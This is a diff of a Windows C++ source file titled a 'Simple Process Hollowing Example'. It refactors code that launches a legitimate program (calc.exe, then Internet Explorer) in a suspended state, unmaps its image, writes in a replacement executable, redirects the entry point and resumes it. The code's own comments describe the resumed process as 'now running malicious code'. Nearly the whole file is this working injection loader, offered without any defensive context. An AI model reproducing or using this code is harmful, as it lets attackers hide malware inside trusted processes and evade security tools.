@@ -1,154 +1,161 @@
 /*
 
-Process Hollowing Example
+Simple Process Hollowing Example
 
 */
+
+#include <stdio.h>
 #include <windows.h>
 #include <fstream>
 #include <winuser.h>
 #include <iostream>
 #include "myntdll.h"
 
-// Initialize variables
-HANDLE hFile;
-LPVOID image, base, mem;
-PROCESS_INFORMATION pi;
-STARTUPINFO si; 
-SIZE_T dwSize, numBytes;
-DWORD read, i;
-PIMAGE_DOS_HEADER pIDH;
-PIMAGE_NT_HEADERS pINH;
-PIMAGE_SECTION_HEADER pISH;
+LPVOID openFile(LPCWSTR const& replacement) {
 
+	//Initialize variables
+	DWORD read;
 
-void RunPE(LPCWSTR const& target, LPCWSTR const& payload) {
+	// Get replacement executable's image
+	HANDLE hFile = CreateFile(replacement, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); // Opens replacement executable
 
-    ZeroMemory(&pi, sizeof(pi)); 
-    ZeroMemory(&si, sizeof(si)); 
-  
-    hFile = CreateFile(payload, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); // Open payload file
+	if (hFile == INVALID_HANDLE_VALUE) {
+		CloseHandle(hFile); // Cleanup
+		printf("\nCreateFile failed with error: %d\n", GetLastError());
+		return 0;
+	}
 
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("\nUnable to open payload file. CreateFile failed with error: %d\n", GetLastError());
-        return;
-    }
+	SIZE_T rSize = GetFileSize(hFile, NULL);
+	LPVOID rBaseAddr = VirtualAlloc(NULL, rSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Allocates memory in current exe for replacement executable
 
-    printf("\nPayload file opened successfully");
-
-    dwSize = GetFileSize(hFile, NULL); // Get payload file size
-
-    image = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // Creates pointer to allocated memory
-
-    if (!ReadFile(hFile, image, dwSize, &read, NULL)) { // Read payload executable's contents to the "read" DWORD
-        printf("\nUnable to read payload contents. ReadFile failed with error: %d\n", GetLastError());
-        return;
-    }
-
-    printf("\nPayload (source) contents read successfully");
-
-    if (!CreateProcess(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { //Creates "target" process in a suspended state
-        printf("\nUnable to run the target process. CreateProcess failed with error: %d\n", GetLastError());
-        return;
-    }
-
-    printf("\nTarget process created successfully");    
-   
-    pIDH = (PIMAGE_DOS_HEADER)image;
-    pINH = (PIMAGE_NT_HEADERS)((LPBYTE)image + pIDH->e_lfanew); // Create variables that store the PE header information of the payload image
-
-    if (pIDH->e_magic != IMAGE_DOS_SIGNATURE) { // Check for valid executable
-        printf("\nError: Invalid executable format.\n");
-        return;
-    }
-
-    printf("\nValid executable format");
-
-    PCONTEXT CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));   // Allocate space for context
-    CTX->ContextFlags = CONTEXT_FULL;
-
-    if (!GetThreadContext(pi.hThread, (LPCONTEXT)CTX)) { // Get target process's thread context 
-        printf("\nUnable to get thread context. GetThreadContext failed with error: %d\n", GetLastError());
-        return;
-    }
-
-    printf("\nSuccessfully retrieved target thread context");
-
-    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(CTX->Ebx + 8), &base, sizeof(LPVOID), NULL)) { // Assign pointer to suspended process's executable section
-        printf("\nUnable to read target process's thread context. ReadProcessMemory failed with error: %d\n", GetLastError()); 
-        return;
-    }
-
-    printf("\nTarget process's thread context read");
-
-    // Unmap suspended process's executable section 
-    if (NtUnmapViewOfSection(pi.hProcess, base)) {
-        printf("\nUnable to unmap target process's executable section. NtUnmapViewOfSection failed with error: %d\n", GetLastError());
-        return;
-    }
-
-
-    // Write malicious image to suspended process's 
-
-
-    printf("\nTarget process's executable section unmapped from address: %#x\n", base);
-
-    // Allocate memory in suspended process's address space for malicious memory buffer to be written to
-    mem = VirtualAllocEx(pi.hProcess, base, pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    if (!mem) {
-        printf("\nError: Unable to allocate memory in child process. VirtualAllocEx failed with error %d\n", GetLastError());
-        return;
-    }
-
-    printf("\nMemory allocated in target process for payload at address: %#x\n", mem);
-
-    // Write payload into allocated memory under suspended process!
-    if (!WriteProcessMemory(pi.hProcess, mem, image, pINH->OptionalHeader.SizeOfHeaders, &numBytes)) {
-        printf("\nUnable to write to target process's allocated memory. WriteProcessMemory failed with error: %d\n", GetLastError());
-        return;
-    }
-
-    printf("\nPayload successfully written: %#x\n", numBytes, "bytes");
-
-    for (i = 0; i < pINH->FileHeader.NumberOfSections; i++) // Writes the rest of the payload executable's sections into the suspended process
-    {
-        pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)image + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
-        WriteProcessMemory(pi.hProcess, (LPVOID)((LPBYTE)mem + pISH->VirtualAddress), (LPVOID)((LPBYTE)image + pISH->PointerToRawData), pISH->SizeOfRawData, NULL); 
-    }
-
-    CTX->Eax = (DWORD)((LPBYTE)mem + pINH->OptionalHeader.AddressOfEntryPoint); // Sets the thread context's EAX register to the entry point adress
-
-    printf("\nSuccessfully set the new entry point at: %#x\n", CTX->Eax);
-
-    WriteProcessMemory(pi.hProcess, (PVOID)(CTX->Ebx + 8), &base, sizeof(PVOID), NULL); 
-
-    SetThreadContext(pi.hThread, (LPCONTEXT)CTX); // Set new thread context to the suspended thread
-
-    printf("\nSuccessfully set the context of the child process's primary thread.\n");
-
-    ResumeThread(pi.hThread); // Resume (unsuspend) the target process thread (now running malicious code)
-
-    printf("\nThread Resumed");
+	ReadFile(hFile, rBaseAddr, rSize, &read, NULL); // Read payload executable's contents to the "read" pointer
+	
+	CloseHandle(hFile); // Cleanup
+	printf("\nReplacement executable read to: 0x%08x\r\n", (UINT)rBaseAddr);
+	return rBaseAddr; // Return the base address of the written memory
 }
 
+void pHollow(LPCWSTR const& target, LPCWSTR const& replacement) {
 
-int main() {
+	// Initialize variables
+	STARTUPINFO startInfo;
+	PROCESS_INFORMATION processInfo;
+	const int baseAddrLength = 4;
+	const int baseAddrOffset = 8;
 
-    // Start RunPE method
-	RunPE(L"C:\\windows\\system32\\calc.exe", L"C:\\Users\\Owner\\Desktop\\Test.exe");
+	// Zero Memory
+	ZeroMemory(&processInfo, sizeof(processInfo));
+	ZeroMemory(&startInfo, sizeof(startInfo));
 
-    // Cleanup
 
-    // CreateProcess cleanup
-    WaitForSingleObject(pi.hProcess, INFINITE); // Waits for created process to exit
-    CloseHandle(pi.hProcess); // Closes process handle 
-    CloseHandle(pi.hThread); // Closes thread handle
 
-    // CreateFile cleanup
-    CloseHandle(hFile); // Closes payload file handle
+	// Get replacement executable's contents
+	LPVOID rBaseAddr = openFile(replacement);
 
-    // VirtualAllocEx cleanup
-    VirtualFree(image, 0, MEM_RELEASE);
-    VirtualFree(GetCurrentProcess, NULL, MEM_RELEASE);
-    return 0;
+
+
+	// Get replacement executable's DOS and NT headers
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)rBaseAddr;
+	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + (DWORD)pDosHeader->e_lfanew);
+
+	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+		printf("Replacemenmt executable does not have a valid DOS signature: %i", GetLastError());
+	}
+
+
+
+	// Create target process in a suspended state
+	if (!CreateProcess(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startInfo, &processInfo)) {
+		printf("\nCreateProcess failed with error: %d\n", GetLastError());
+		return;
+	}
+
+
+	// Get suspeded process's thread context
+	PCONTEXT pCTX = new CONTEXT(); // Create a CONTEXT object
+	pCTX->ContextFlags = CONTEXT_FULL;
+
+	if (!GetThreadContext(processInfo.hThread, pCTX)) { // Get target process's thread context 
+		printf("\nUnable to get thread context. GetThreadContext failed with error: %d\n", GetLastError());
+		return;
+	}
+
+	printf("\nTarget process's thread context retrieved\r\n");
+	printf("Target PEB address: EBX = 0x%08x\r\n", (UINT)pCTX->Ebx);
+	printf("Target address of entry point: EAX = 0x%08x\r\n", (UINT)pCTX->Eax);
+
+
+
+	// Get target process image's base address
+	PVOID tBaseAddr;
+
+	if (!ReadProcessMemory(processInfo.hProcess, (LPCVOID)(pCTX->Ebx + baseAddrOffset), &tBaseAddr, sizeof(LPVOID), NULL)) { // Gets the base address from the thread context
+		printf("\nUnable to read target process's thread context. ReadProcessMemory failed with error: %d\n", GetLastError());
+		return;
+	}
+
+	printf("Target image base address at address: 0x%08x\r\n", (UINT)tBaseAddr);
+
+
+
+	// Unmap target memory at base address 
+	if (NtUnmapViewOfSection(processInfo.hProcess, tBaseAddr)) {
+		printf("\nUnable to unmap target process's executable section. NtUnmapViewOfSection failed with error: %d\n", GetLastError());
+		return;
+	}
+	printf("\nHollowed target executable section at base address: 0x%08x\r\n", (UINT)tBaseAddr);
+
+
+
+	// Allocate memory for replacement image
+	LPVOID hollowedSection = VirtualAllocEx(processInfo.hProcess, tBaseAddr, pNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (!hollowedSection) {
+		printf("\nVirtualAllocEx failed with error %d\n", GetLastError());
+		return;
+	}
+	printf("Allocated memory in target process for replacement image at: 0x%08x\r\n", (UINT)tBaseAddr);
+
+
+
+	// Copy headers into allocation
+	if (!WriteProcessMemory(processInfo.hProcess, tBaseAddr, pDosHeader, pNTHeader->OptionalHeader.SizeOfHeaders, NULL)) {
+		printf("\nUnable to write to target process's allocated memory. WriteProcessMemory failed with error: %d\n", GetLastError());
+		return;
+	}
+
+
+
+	// Copy the other sections
+	for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++) // Writes the rest of the payload executable's sections into the suspended process
+	{
+		PIMAGE_SECTION_HEADER pSectionData = (PIMAGE_SECTION_HEADER)((LPBYTE)rBaseAddr + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+		WriteProcessMemory(processInfo.hProcess, (PVOID)((LPBYTE)hollowedSection + pSectionData->VirtualAddress), (PVOID)((LPBYTE)rBaseAddr + pSectionData->PointerToRawData), pSectionData->SizeOfRawData, NULL);
+	}
+
+
+	// Overwrite thread context and PEB
+	pCTX->Eax = (DWORD)hollowedSection + (DWORD)pNTHeader->OptionalHeader.AddressOfEntryPoint; // Sets the thread context's EAX register to the entry point adress
+	printf("\nSuccessfully set the new entry point at: 0x%08x\n", (UINT)pCTX->Eax);
+
+	WriteProcessMemory(processInfo.hProcess, (PVOID)(pCTX->Ebx + baseAddrOffset), &tBaseAddr, baseAddrLength, NULL); // Overwrites PEB base address with that of the replacement image
+	
+	SetThreadContext(processInfo.hThread, pCTX); // Set new thread context to the suspended thread
+	
+	ResumeThread(processInfo.hThread); // Resume (unsuspend) the target process thread (now running malicious code)
+
+	printf("\nThread Resumed");
+
+	// Cleanup
+
+	WaitForSingleObject(processInfo.hProcess, INFINITE); // Waits for created process to exit
+	CloseHandle(processInfo.hProcess); // Closes process handle 
+	CloseHandle(processInfo.hThread); // Closes thread handle
+
+	// VirtualAllocEx cleanup
+	VirtualFree(rBaseAddr, 0, MEM_RELEASE);
+	//VirtualFree(GetCurrentProcess, NULL, MEM_RELEASE);
+}
+
+void main() {
+	pHollow(L"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe", L"C:\\Users\\Owner\\Desktop\\Test.exe");
 }
